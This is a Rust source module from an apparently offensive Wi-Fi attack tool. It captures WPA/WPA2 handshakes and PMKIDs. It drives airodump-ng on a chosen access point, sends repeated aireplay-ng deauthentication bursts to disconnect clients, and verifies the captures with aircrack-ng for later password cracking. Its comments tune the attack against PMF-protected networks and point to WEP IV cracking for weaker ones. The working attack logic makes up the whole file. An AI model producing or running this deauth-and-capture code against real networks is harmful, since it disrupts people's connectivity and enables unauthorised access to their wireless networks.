use crate::quit;
use crate::scanner::WifiNetwork;
use crate::security::SecurityType;
use anyhow::{Context, Result};
use colored::Colorize;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

#[derive(Debug, Clone)]
pub struct HandshakeCapture {
    pub network: WifiNetwork,
    pub cap_file: PathBuf,
    pub captured: bool,
    pub pmkid: bool,
}

pub fn capture_handshakes(
    iface: &str,
    networks: &[&WifiNetwork],
    output_dir: &Path,
    timeout_secs: u64,
) -> Result<Vec<HandshakeCapture>> {
    fs::create_dir_all(output_dir).context("failed to create captures directory")?;

    let targets: Vec<_> = networks
        .iter()
        .filter(|n| n.security.needs_handshake())
        .copied()
        .collect();

    if targets.is_empty() {
        println!(
            "\n  {} No WPA/WPA2 targets require handshake capture.",
            "ℹ".blue()
        );
        return Ok(Vec::new());
    }

    println!(
        "\n{}",
        "═══ Capturing WPA Handshakes ═══".bold().cyan()
    );
    println!(
        "  {} target(s)  ·  {}\n",
        targets.len(),
        quit::hint().dimmed()
    );

    let mut results = Vec::new();

    for (i, net) in targets.iter().enumerate() {
        quit::abort_if()?;

        println!(
            "  [{}/{}] {} ({}) ch:{}  {}  {} client(s)",
            i + 1,
            targets.len(),
            net.essid.bold(),
            net.bssid.dimmed(),
            net.channel,
            net.security.label(),
            net.clients.len()
        );

        if net.security.pmf_likely() {
            println!(
                "        {} WPA2/WPA3: 802.11w PMF drops unprotected deauth.",
                "ℹ".blue()
            );
            println!(
                "        {} Only WPA2-PSK clients (no PMF) will rehandshake. SAE clients will not.",
                "ℹ".blue()
            );
        }

        let cap_path = output_dir.join(sanitize_filename(&format!(
            "{}_{}",
            net.essid,
            net.bssid.replace(':', "")
        )));
        let result = capture_single(iface, net, &cap_path, timeout_secs)?;

        if result.captured {
            let kind = if result.pmkid { "PMKID" } else { "handshake" };
            println!(
                "        {} {} captured → {}",
                "✓".green().bold(),
                kind,
                result.cap_file.display()
            );
        } else {
            let why = if net.security.pmf_likely() {
                "no EAPOL/PMKID (clients likely on WPA3+PMF — deauth ignored)"
            } else if net.clients.is_empty() {
                "no handshake (no associated clients seen)"
            } else {
                "no handshake (deauth missed, wrong channel, or clients idle)"
            };
            println!("        {} {why}", "✗".red());
        }

        results.push(result);
    }

    let success = results.iter().filter(|r| r.captured).count();
    println!(
        "\n  Captured {}/{} handshakes",
        success.to_string().green(),
        results.len()
    );

    Ok(results)
}

fn capture_single(
    iface: &str,
    net: &WifiNetwork,
    cap_prefix: &Path,
    timeout_secs: u64,
) -> Result<HandshakeCapture> {
    let timeout_secs = if net.security.pmf_likely() {
        timeout_secs.max(45)
    } else {
        timeout_secs
    };

    lock_channel(iface, net.channel);

    let prefix_str = cap_prefix.to_string_lossy();

    let mut dump = Command::new("airodump-ng")
        .args([
            "--bssid",
            &net.bssid,
            "--channel",
            &net.channel.to_string(),
            "--write",
            &prefix_str,
            "--output-format",
            "pcap,csv",
            "--write-interval",
            "1",
            "--ignore-negative-one",
            iface,
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .context("failed to start airodump-ng for capture")?;

    let dump_pid = dump.id();
    quit::track_pid(dump_pid);

    // Let airodump lock the channel and see stations before injecting.
    if let Err(e) = quit::sleep(Duration::from_secs(4)) {
        let _ = dump.kill();
        let _ = dump.wait();
        quit::untrack_pid(dump_pid);
        return Err(e);
    }

    let start = Instant::now();
    let mut captured = false;
    let mut pmkid = false;
    let mut last_deauth = Instant::now() - Duration::from_secs(30);
    let mut last_check = Instant::now() - Duration::from_secs(2);
    let mut round = 0u32;

    while start.elapsed() < Duration::from_secs(timeout_secs) {
        quit::abort_if().map_err(|e| {
            let _ = dump.kill();
            let _ = dump.wait();
            quit::untrack_pid(dump_pid);
            e
        })?;

        let mut clients = net.clients.clone();
        if last_check.elapsed() >= Duration::from_secs(2) {
            if let Ok(csv) = find_csv_file(cap_prefix) {
                if let Ok(parsed) = crate::scanner::parse_airodump_csv(&csv) {
                    if let Some(live) = parsed.iter().find(|n| n.bssid.eq_ignore_ascii_case(&net.bssid)) {
                        for c in &live.clients {
                            if !clients.iter().any(|x| x.eq_ignore_ascii_case(c)) {
                                clients.push(c.clone());
                            }
                        }
                    }
                }
            }

            if let Ok(cap) = find_cap_file(cap_prefix) {
                let status = handshake_status(&cap, &net.bssid)?;
                if status.usable {
                    captured = true;
                    pmkid = status.pmkid;
                    break;
                }
            }
            last_check = Instant::now();
        }

        // Small spaced bursts. Flooding deauth prevents the 4-way from finishing.
        if last_deauth.elapsed() >= Duration::from_secs(8) {
            round += 1;
            send_deauth(iface, net, &clients, round);
            last_deauth = Instant::now();
        }

        let elapsed = start.elapsed().as_secs();
        print!(
            "\r        listening {elapsed:>2}s/{timeout_secs}s  clients:{}  {}          ",
            clients.len(),
            quit::hint().dimmed()
        );
        let _ = std::io::stdout().flush();

        if let Err(e) = quit::sleep(Duration::from_millis(400)) {
            let _ = dump.kill();
            let _ = dump.wait();
            quit::untrack_pid(dump_pid);
            println!();
            return Err(e);
        }
    }
    println!();

    let _ = dump.kill();
    let _ = dump.wait();
    quit::untrack_pid(dump_pid);

    let cap_file = find_cap_file(cap_prefix).unwrap_or_else(|_| cap_prefix.with_extension("cap"));

    if !captured && cap_file.exists() {
        let status = handshake_status(&cap_file, &net.bssid).unwrap_or(HandshakeStatus {
            usable: false,
            pmkid: false,
        });
        captured = status.usable;
        pmkid = status.pmkid;
    }

    Ok(HandshakeCapture {
        network: net.clone(),
        cap_file,
        captured,
        pmkid,
    })
}

fn lock_channel(iface: &str, channel: u8) {
    if channel == 0 {
        return;
    }
    let _ = Command::new("iw")
        .args(["dev", iface, "set", "channel", &channel.to_string()])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
}

fn send_deauth(iface: &str, net: &WifiNetwork, clients: &[String], round: u32) {
    let frames = if net.security.pmf_likely() { "3" } else { "4" };

    if !clients.is_empty() {
        // Unicast deauth is far more reliable than broadcast.
        let client = &clients[(round.saturating_sub(1) as usize) % clients.len()];
        let _ = Command::new("aireplay-ng")
            .args([
                "--deauth",
                frames,
                "-a",
                &net.bssid,
                "-c",
                client,
                "-D",
                iface,
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
        print!(
            "\r        deauth → {} ({})          ",
            client.dimmed(),
            net.essid
        );
        let _ = std::io::stdout().flush();
        return;
    }

    if net.security.pmf_likely() && round > 2 {
        // Broadcast deauth is useless against PMF; stay passive for PMKID/EAPOL.
        return;
    }

    let _ = Command::new("aireplay-ng")
        .args(["--deauth", frames, "-a", &net.bssid, "-D", iface])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
}

struct HandshakeStatus {
    usable: bool,
    pmkid: bool,
}

fn find_cap_file(prefix: &Path) -> Result<PathBuf> {
    find_prefixed(prefix, "cap")
}

fn find_csv_file(prefix: &Path) -> Result<PathBuf> {
    find_prefixed(prefix, "csv")
}

fn find_prefixed(prefix: &Path, ext: &str) -> Result<PathBuf> {
    let parent = prefix.parent().unwrap_or(Path::new("."));
    let stem = prefix.file_name().unwrap_or_default().to_string_lossy();

    let mut files: Vec<PathBuf> = fs::read_dir(parent)
        .context("failed to read capture directory")?
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| {
            p.file_name()
                .map(|n| n.to_string_lossy().starts_with(&*stem))
                .unwrap_or(false)
                && p.extension().map(|e| e == ext).unwrap_or(false)
        })
        .collect();

    files.sort_by_key(|p| fs::metadata(p).and_then(|m| m.modified()).ok());
    files
        .pop()
        .with_context(|| format!("no .{ext} file for {}", prefix.display()))
}

fn handshake_status(cap_file: &Path, bssid: &str) -> Result<HandshakeStatus> {
    if !cap_file.exists() {
        return Ok(HandshakeStatus {
            usable: false,
            pmkid: false,
        });
    }

    let output = Command::new("aircrack-ng")
        .args([
            "-a",
            "2",
            "-b",
            bssid,
            cap_file.to_str().unwrap_or(""),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .context("failed to run aircrack-ng verification")?;

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    )
    .to_lowercase();

    let pmkid = combined.contains("pmkid")
        && !combined.contains("0 pmkid")
        && !combined.contains("(0 pmkid)");
    let handshake = regex::Regex::new(r"\(\s*[1-9]\d*\s*handshake")
        .ok()
        .map(|re| re.is_match(&combined))
        .unwrap_or(false);

    Ok(HandshakeStatus {
        usable: pmkid || handshake,
        pmkid,
    })
}

pub fn capture_open_wep_info(net: &WifiNetwork) -> String {
    match net.security {
        SecurityType::Open => "Connect directly — no key needed".into(),
        SecurityType::Wep => "Use airodump-ng IV capture + aircrack-ng WEP crack".into(),
        _ => String::new(),
    }
}

fn sanitize_filename(name: &str) -> String {
    name.chars()
        .map(|c| {
            if c.is_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '_'
            }
        })
        .collect()
}

pub fn handle_non_wpa_targets(networks: &[&WifiNetwork]) {
    let non_wpa: Vec<_> = networks
        .iter()
        .filter(|n| !n.security.needs_handshake())
        .copied()
        .collect();

    if non_wpa.is_empty() {
        return;
    }

    println!(
        "\n{}",
        "═══ Non-WPA Vulnerable Networks ═══".bold().cyan()
    );

    for net in non_wpa {
        let advice = capture_open_wep_info(net);
        println!(
            "  {} {} ({}) — {}",
            "→".yellow(),
            net.essid.bold(),
            net.security.label(),
            advice
        );
    }
}
